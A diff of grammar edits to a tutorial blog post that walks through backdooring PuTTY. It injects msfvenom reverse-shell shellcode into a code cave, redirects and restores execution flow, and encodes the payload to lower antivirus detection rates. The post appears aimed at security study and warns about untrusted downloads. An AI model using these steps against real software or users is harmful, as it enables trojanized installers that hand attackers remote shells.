@@ -16,13 +16,13 @@
 
 = Backdooring PuTTY
 
-Internet is a dangerous place. It contains billions of points that can be
-accessed using an ever increasingly range of devices. Endpoint protections
-are improving during time, but there is always a new technique that overcomes
-it.
+The Internet is a dangerous place. It contains billions of points that can be
+accessed using an ever-increasingly range of devices.
+Endpoint protections are improving over time,
+but there is always a new technique that overcomes them.
 
-Antivirus software is a clear example of an endpoint protection method that's
-constantly improving trying to overcome its own limitations.
+Antivirus software is a clear example of an endpoint protection method
+that's constantly improving, trying to overcome its limitations.
 
 Most antivirus offerings use signatures to detect malware. A signature is
 nothing but a sequence of bytes.
@@ -51,9 +51,9 @@ $ msf-virustotal -f virus | grep ClamAV
  ClamAV                true      0.102.3.0             Win.Trojan.SubSeven-2  20200624
 ----
 
-And it's detected as a the expected virus.
+And it's detected as an expected virus.
 
-But then I changed a single byte: The last `F0` for a `FA`:
+But then I changed a single byte: The last `f0` for an `fa`:
 
 [source,text]
 ----
@@ -71,12 +71,12 @@ $ msf-virustotal -f virus | grep ClamAV
  ClamAV                false     0.102.3.0                     20200624
 ----
 
-The check failed! Antivirus based on signatures are easily fooled.
+The check failed! Antiviruses based on signatures are easily fooled.
 
 In this post, we will be able to backdoor the latest available version
-of PuTTY (0.73 to the date of this writing), with a reverse shell. We will
-also try to evade today's modern antivirus which are not only based on
-signatures, but also on behavior.
+of PuTTY (0.73 to the date of this writing) with a reverse shell.
+We will also try to evade today's modern antiviruses,
+which are not only based on signatures but also on behavior.
 
 == Strategy
 
@@ -84,7 +84,7 @@ The following are the steps that we will take to convert the original
 `putty.exe` to its backdoored version:
 
 . Find space to include our shellcode.
-. Check the current `putty.exe` PE properties and modified them as needed.
+. Check the current `putty.exe` PE properties and modify them as needed.
 . Add a shellcode.
 . Redirect the execution flow of the application to our code.
 . Restore execution flow.
@@ -92,12 +92,12 @@ The following are the steps that we will take to convert the original
 
 == Finding space
 
-If we are going to inject new code to a file, we must find a memory block
-with the required space that we can manipulate without modifying the
-normal flow of the application.
+If we are going to inject new code into a file,
+we must find a memory block with the required space to manipulate
+without modifying the normal flow of the application.
 
-That "blank" spaces are known as *code caves* and are present on almost any
-executable file. They are composed commonly of `0xCC`, `0x90` or `0x00` bytes.
+These "blank" spaces are known as *code caves* and are present on almost any
+executable file. They are composed commonly of `0xCC`, `0x90`, or `0x00` bytes.
 
 There are several tools that help us finding code caves. The tool I prefer
 is link:https://github.com/EgeBalci/Cminer[Cminer]. Let's run it over our
@@ -162,28 +162,29 @@ Magic			010b	(PE32)
 [*] File Ofset: 0xb5403
 ----
 
-We will use the last one for this example which contains 509 bytes.
+We will use the last one for this example, which contains 509 bytes.
 
 == Getting executable characteristics
 
-That code cave we chose is located at the `.00cfg` PE section.
+The code cave we chose is located in the `.00cfg` PE section.
 
 Sections are the way the different regions of the virtual memory of a PE
-file are distributed. There are several predefined sections and
-each of them have specific purposes, mostly determined by the
+file are distributed. There are several predefined sections,
+and each of them has specific purposes, mostly determined by the
 characteristics than for the section name itself. In fact, the name
-can be anything and the PE header will have pointers to them.
+can be anything, and the PE header will have pointers to them.
 
-There is a section called `.text`  which is commonly used to store the
+There is a section called `.text`, which is commonly used to store the
 executable code of the file. As that section is meant to be executable,
-the characteristics of that section are commonly `READ | EXEC`.
+its characteristics are commonly `READ | EXEC`.
 
 Likewise, there are other sections that hold initialized data and
 global variables like `.data` and `.bss` whose contents are only meant to be
 `READ | WRITE`, and not executed.
 
-The section on which our code cave is located is `.00cfg` which is a non
-standard section. We can check its current characteristics using many tools.
+The section on which our code cave is located is `.00cfg`,
+which is a non-standard section.
+We can check its current characteristics using many tools.
 I will use link:https://github.com/petoolse/petools[PE Tools]:
 
 image::petools1.gif[PE Characteristics]
@@ -203,7 +204,7 @@ address space of an executable file at rest is the same as when
 it's launched and a process instance is created. However, every time we
 load `putty.exe` on a debugger, the address space changes on memory.
 This is because  of something called *Address Space Layout Randomization*
-or *ASLR*. This is a protection added to executable files to make it hard
+or *ASLR*. This is protection added to executable files to make it hard
 for attackers to link:../vulnserver-trun/[exploit overflows] using
 absolute addresses.
 
@@ -212,20 +213,20 @@ while we finish and can be enabled at the end. Let's do that:
 
 image::aslr1.gif[New PE Characteristics]
 
-As you can see, I use link:https://ntcore.com/?page_id=388[CFF explorer] to
-change the `DLL Characteristics` of the `putty.exe` file, and disabled the
-`DLL can move` option which is the indicator of the presence of `ASLR`.
+As you can see, I used link:https://ntcore.com/?page_id=388[CFF explorer] to
+change the `DLL Characteristics` of the `putty.exe` file and disabled the
+`DLL can move` option, which is the indicator of the presence of `ASLR`.
 
-We must remind to be careful to use relative calculations and avoid absolute
-addresses, or `ASLR` will take its toll at the end.
+We must remember to be careful to use relative calculations
+and avoid absolute addresses, or `ASLR` will take its toll at the end.
 
 With that in place, we can start the backdooring process.
 
-== A needed parentheses
+== A needed parenthesis
 
-Before going into inserting new bytes to our file, we must check two things
-at this point: Whether the file is still working as originally expected and if
-it's flagged as malicious.
+Before going into inserting new bytes into our file, we must check two things:
+Whether the file is still working as originally expected
+and if it's flagged as malicious.
 
 The first check is easy:
 
@@ -242,7 +243,7 @@ $ msf-virustotal -f /mnt/hgfs/Desktop-Host/osce/putty/putty.exe
 [*] Analysis Report: putty.exe (14 / 74): b28ceceac0b0564110d70eac176e151e616a744c6289ff5c86f2484fa987aca5
 ----
 
-This tells us that 14 out of 74 antivirus flag this new file as malicious.
+This tells us that 14 out of 74 antiviruses flag this new file as malicious.
 
 In contrast, the original file was only flagged by 4:
 
@@ -254,15 +255,15 @@ $ msf-virustotal -f /mnt/hgfs/Desktop-Host/osce/putty/putty-orig.exe
 [*] Analysis Report: putty-orig.exe (4 / 73): 736330aaa3a4683d3cc866153510763351a60062a236d22b12f4fe0f10853582
 ----
 
-We must keep that values in mind, to have something to compare our final file
-with.
+We must keep those values in mind
+to have something to compare our final file with.
 
 Let's resume our process!
 
 == Making up the code cave
 
 Before injecting a shellcode, we need to locate the code cave on our file.
-`Cminer` showed that it started at `0x4bb003` and, as we disabled `ASLR`,
+`Cminer` showed that it started at `0x4bb003`, and as we disabled `ASLR`,
 we should be able to locate it at that exact address.
 I will use link:https://x64dbg.com[x64dbg] a modern open-source debugger for
 Windows:
@@ -273,24 +274,24 @@ Great, as you can see, our code cave it's a region full of `0x00` bytes.
 It's a good idea to change those `0x00` to something that doesn't block
 the execution flow, like `NOPs` (`0x90`).
 To do that, we need to select the addresses we want to modify, then
-right click on the `CPU` window, select `Binary` and finally `Fill with NOPs`.
+right-click on the `CPU` window, select `Binary` and finally `Fill with NOPs`.
 
 image::fillnops1.gif[Fill NOPs]
 
 With that, we have an empty canvas to work on.
 
-It is also a good idea to save every progress of the backdooring in a new
-separated file, so we can go back if anything's not working.
-To do that, we can issue `Ctrl+P` that will show the current actual changes
+It is also a good idea to save every progress of the backdooring in a
+separate new file, so we can go back if anything's not working.
+To do that, we can issue `Ctrl+P` that will show the actual current changes
 we've made and save the "patches" to a new file.
 
 image::patch1.gif[Patch1]
 
-With that in place, we can start injecting instructions to our code cave.
+With that in place, we can start injecting instructions into our code cave.
 The first thing we must do is save the current value of the CPU registers
 and flags, so we can restore the normal flow of the application after
 executing our shellcode. If we don't do that, the application will have
-unexpected behavior and the backdooring will be detected!
+unexpected behavior, and the backdooring will be detected!
 
 The instructions for saving the CPU registers and flags are:
 
@@ -315,7 +316,7 @@ that can execute anything, commonly a shell.
 In our example, we will create a shellcode that connects back from the victim
 to the attacker machine and serves a reverse shell.
 
-To to that, we will use `msvenom`:
+To do that, we will use `msvenom`:
 
 [source,console]
 ----
@@ -337,10 +338,10 @@ e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e5656535668
 Notice that I chose `LPORT=443` instead of the default `4444`. This will
 hopefully help to disguise this reverse shell a little.
 
-We can now insert that bytes on our code cave.
+We can now insert those bytes on our code cave.
 
-Here we can see the addresses on where the `pushad/pushfd` instructions were
-injected
+Here we can see the addresses
+on where the `pushad/pushfd` instructions were injected:
 
 [source,x86asm]
 ----
@@ -351,8 +352,8 @@ injected
 To make some room for any needed encoder/decoder, I will use the address
 `004BB060` as the place where the shellcode will be placed. To inject the
 shellcode, we must select the output of `msfvenom` in `hex` format, then
-on the debugger, select an address region large enough to fit our shellcode,
-then right click, select `Binary` and then `Paste`.
+on the debugger select an address region large enough to fit our shellcode,
+then right-click, select `Binary` and then `Paste`.
 
 image::pasteshell1.gif[Paste shell]
 
@@ -376,16 +377,16 @@ issued:
 
 image::loginas2.gif[Login as]
 
-We had two locations and we need to know which of them is
+We had two locations, and we need to know which of them is
 the one we need, so we had to put breakpoints and check:
 
 image::breakpoint1.gif[Breakpoint]
 
 We got a hit!
 
-As you can see, we hit just before a `call`. I mention before that
-we need to use relative calculations to overcome `ASLR` limitations. That's
-why we will divert the execution *after* the `call`, here:
+As you can see, we hit just before a `call`. I mentioned before that
+we need to use relative calculations to overcome `ASLR` limitations.
+That's why we will divert the execution *after* the `call`, here:
 
 image::breakpoint2.png[Breakpoint]
 
@@ -401,7 +402,7 @@ image::jmp1.gif[Jump to code cave]
 
 Now I will save the modifications to `patch-03.exe`.
 
-Now remember that we need to restore the execution flow after our
+Remember that we need to restore the execution flow after our
 shellcode. Let's do that.
 
 == Restore execution flow
@@ -433,9 +434,9 @@ listener in the attacker machine:
 
 image::espafter.gif[ESP after]
 
-Great! We got the shell and the `ESP` value is `0019FC30`. However, the
-breakpoint was reached only *after* exiting the shell. We will need to
-modify the shellcode later.
+Great! We got the shell, and the `ESP` value is `0019FC30`.
+However, the breakpoint was reached only *after* exiting the shell.
+We will need to modify the shellcode later.
 
 === Get the offset
 
@@ -482,7 +483,7 @@ And the resulting instructions when we added the jump to our code cave were:
 0042D6FF | FF73 78               | push dword ptr ds:[ebx+78]            |
 ----
 
-That means that we overwrote two instructions: `add esp,4` and `xor ecx,ecx`
+That means that we overwrote two instructions: `add esp,4` and `xor ecx,ecx`,
 and they need to be restored. We also see that the next instruction in
 the normal execution flow is located at `0042D6FC`. So, to finish our
 restoration, we need to add this:
@@ -500,8 +501,8 @@ We can now save the changes to a new file `patch-04.exe`:
 
 image::patchrestore1.gif[Patch restore]
 
-At this point, we should be able to launch `PuTTY`, get a shell and resume
-normal execution:
+At this point, we should be able to launch `PuTTY`, get a shell,
+and resume normal execution:
 
 image::working1.gif[Working]
 
@@ -512,8 +513,8 @@ However, as you can see, the execution is only resumed when the shell exits.
 That behavior is caused by the way the reverse shell was implemented on
 `Metasploit`. It uses a call to `WaitForSingleObject` that instructs the
 parent process to wait infinitely until the shell process is done.
-This makes the shellcode more reliable, but for our purpose, we need a
-different behavior.
+This makes the shellcode more reliable, but for our purpose,
+we need a different behavior.
 
 The `WaitForSingleObject` function signature is:
 
@@ -527,8 +528,8 @@ DWORD WaitForSingleObject(
 ----
 
 Our reverse shell sets the value of `dwMilliseconds` parameter to `-1`,
-which makes it to way forever for the process to finish. That value is set at
-this position on the shellcode:
+which makes it wait forever for the process to finish.
+That value is set at this position on the shellcode:
 
 [source,x86asm]
 ----
@@ -563,8 +564,8 @@ A common method is to use the `XOR` instruction on every byte, but an
 average antivirus nowadays will be able to revert it easily. We are
 going to try something more.
 
-The mutations we perform over the code must be reversible, so for the sake
-of this example I will use this encoder strategy:
+The mutations we perform over the code must be reversible,
+so for the sake of this example, I will use this encoder strategy:
 
 . `XOR` byte with key `0xD`.
 . Add `0x2` to byte.
@@ -580,7 +581,7 @@ not byte [eax]
 rol byte [eax],0x8
 ----
 
-And the decoder should be the reverse instructions, in reverse order:
+And the decoder should be the instructions in reverse order:
 
 . Rotate right 8 bits.
 . Bit-wise negate byte.
@@ -620,11 +621,11 @@ image::encoder1.png[Encoder]
 
 Save that changes to a file called `putty-06.exe`.
 
-Now, we can watch the process of encoding on real time:
+Now, we can watch the process of encoding in real-time:
 
 image::encoded1.gif[Encoder]
 
-Wonderful. Now, select those modified bytes, then right click, then
+Wonderful. Now, select those modified bytes, then right-click, then
 `Binary`, then `Copy`. Restart the debugging session with `Ctrl+F2` and
 go to that address region again and hit `Shift+V` to binary paste.
 
@@ -632,15 +633,15 @@ We are now ready to patch the file to a new one called `putty-07.exe`.
 
 === Decoding
 
-Now, all that's left is to replace the encoder with the decoder on our
+All that's left is to replace the encoder with the decoder on our
 `putty-07.exe` file:
 
 image::decoder1.png[Decoder]
 
-And save the patches to a file called `putty-final.exe`.
+And save the patches in a file called `putty-final.exe`.
 
-If everything comes as expected, `putty-final.exe` will run, then decode
-itself in memory, send us a reverse shell and resume normal execution.
+If everything comes as expected, `putty-final.exe` will run,
+decode itself in memory, send us a reverse shell and resume normal execution.
 
 image::success.gif[PuTTY working]
 
@@ -662,5 +663,6 @@ Awesome! We were able to lower the ratio of antivirus tagging from 27 to 10!
 
 == Conclusion
 
-Internet is full of dangers. We hope this article will show you the risks
+The Internet is full of dangers.
+We hope this article has shown you the risks
 of running software obtained from untrusted sources.
